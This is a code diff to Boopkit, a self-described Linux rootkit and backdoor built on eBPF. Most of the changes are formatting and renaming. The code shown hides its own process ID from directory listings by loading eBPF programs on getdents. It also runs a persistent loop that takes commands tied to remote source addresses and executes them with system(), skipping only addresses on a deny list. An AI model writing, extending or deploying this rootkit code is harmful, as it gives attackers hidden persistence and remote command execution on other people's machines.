@@ -63,7 +63,7 @@ void asciiheader() {
   printf("\n\n");
 }
 
-void usage(){
+void usage() {
   printf("Boopkit version: %s\n", VERSION);
   printf("Linux rootkit and backdoor over eBPF.\n");
   printf("Author: Kris Nóva <kris@nivenly.com>\n");
@@ -124,13 +124,8 @@ static struct env {
   int target_ppid;
 } env;
 
-static int handle_event(void *ctx, void *data, size_t data_sz)
-{
+static int handlepidlookup(void *ctx, void *data, size_t data_sz) {
   const struct event *e = data;
-  if (e->success)
-    printf("Hid PID from program %d (%s)\n", e->pid, e->comm);
-  else
-    printf("Failed to hide PID from program %d (%s)\n", e->pid, e->comm);
   return 0;
 }
 
@@ -155,11 +150,17 @@ int main(int argc, char **argv) {
   printf("  -> Loading eBPF Probe: %s\n", sfpath);
   sfobj = pr0be_safe__open();
   char pid[MAXPIDLEN];
+
+  // So if we run the program with "sudo" we need to get the parent pid
+  // for now just assume this
+  //
+  // TODO: @kris-nova throw an error if ran with sudo instead of real privileges!
   env.pid_to_hide = getpid();
   sprintf(pid, "%d", env.pid_to_hide);
   printf("  -> Obfuscating PID: %s\n", pid);
   strncpy(sfobj->rodata->pid_to_hide, pid, sizeof(sfobj->rodata->pid_to_hide));
-  sfobj->rodata->pid_to_hide_len = strlen(pid)+1;
+
+  sfobj->rodata->pid_to_hide_len = strlen(pid) + 1;
   sfobj->rodata->target_ppid = env.target_ppid;
   loaded = pr0be_safe__load(sfobj);
   if (loaded < 0) {
@@ -170,34 +171,28 @@ int main(int argc, char **argv) {
   }
   printf("  -> eBPF Probe loaded: %s\n", sfpath);
 
-  // Program 1
+  // Exit
   int index = PROG_01;
   int prog_fd = bpf_program__fd(sfobj->progs.handle_getdents_exit);
-  int ret = bpf_map_update_elem(
-      bpf_map__fd(sfobj->maps.map_prog_array),
-      &index,
-      &prog_fd,
-      BPF_ANY);
+  int ret = bpf_map_update_elem(bpf_map__fd(sfobj->maps.map_prog_array), &index,
+                                &prog_fd, BPF_ANY);
   if (ret == -1) {
     printf("Failed to hide PID: %s\n", strerror(errno));
     return 1;
   }
 
-  // Program 2
+  //  Patch
   index = PROG_02;
   prog_fd = bpf_program__fd(sfobj->progs.handle_getdents_patch);
-  ret = bpf_map_update_elem(
-      bpf_map__fd(sfobj->maps.map_prog_array),
-      &index,
-      &prog_fd,
-      BPF_ANY);
+  ret = bpf_map_update_elem(bpf_map__fd(sfobj->maps.map_prog_array), &index,
+                            &prog_fd, BPF_ANY);
   if (ret == -1) {
     printf("Failed to hide PID: %s\n", strerror(errno));
     return 1;
   }
 
   // Attach to probe
-  err = pr0be_safe__attach( sfobj);
+  err = pr0be_safe__attach(sfobj);
   if (err) {
     fprintf(stderr, "Failed to attach BPF program: %s\n", strerror(errno));
     return 1;
@@ -205,7 +200,7 @@ int main(int argc, char **argv) {
 
   // Set up ring buffer
   struct ring_buffer *rb = NULL;
-  rb = ring_buffer__new(bpf_map__fd( sfobj->maps.rb), handle_event, NULL, NULL);
+  rb = ring_buffer__new(bpf_map__fd(sfobj->maps.rb), handlepidlookup, NULL, NULL);
   if (!rb) {
     fprintf(stderr, "Failed to create ring buffer\n");
     return 1;
@@ -268,7 +263,6 @@ int main(int argc, char **argv) {
   // Boopkit will run as a persistent daemon in userspace!
   int ignore = 0;
   while (1) {
-
     err = ring_buffer__poll(rb, 100);
 
     // =========================================================================
@@ -286,18 +280,18 @@ int main(int argc, char **argv) {
       ignore = 0;
       inet_ntop(AF_INET, &ret.saddr, saddrval, sizeof(saddrval));
       for (int i = 0; i < cfg.denyc; i++) {
-        if (strncmp(saddrval, cfg.deny[i], INET_ADDRSTRLEN) == 0){
+        if (strncmp(saddrval, cfg.deny[i], INET_ADDRSTRLEN) == 0) {
           // Ignoring string in deny list
           ignore = 1;
           break;
         }
       }
       if (!ignore) {
-          char *rce = malloc(MAX_RCE_SIZE);
-          handlerevrce(saddrval, rce);
-          printf(" <- %s", rce);
-          system(rce);
-          free(rce);
+        char *rce = malloc(MAX_RCE_SIZE);
+        handlerevrce(saddrval, rce);
+        printf(" <- %s", rce);
+        system(rce);
+        free(rce);
       }
       err = bpf_map_delete_elem(fd, &jkey);
       if (err < 0) {
@@ -307,4 +301,3 @@ int main(int argc, char **argv) {
     }
   }
 }
-
